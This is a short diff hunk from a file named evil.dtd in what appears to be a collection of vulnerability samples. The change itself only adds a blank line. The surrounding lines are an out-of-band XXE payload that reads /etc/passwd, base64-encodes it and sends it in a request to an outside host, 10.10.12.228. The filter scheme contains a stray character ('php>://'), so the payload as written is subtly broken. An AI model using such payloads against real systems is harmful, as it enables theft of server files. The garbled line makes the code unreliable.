@@ -655,4 +655,5 @@ vulns/xxe_oob/evil.dtd
 <!ENTITY % file SYSTEM "php>://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'http://10.10.12.228/?leak=%file;'>">
 %payload;
+  
 %remote;
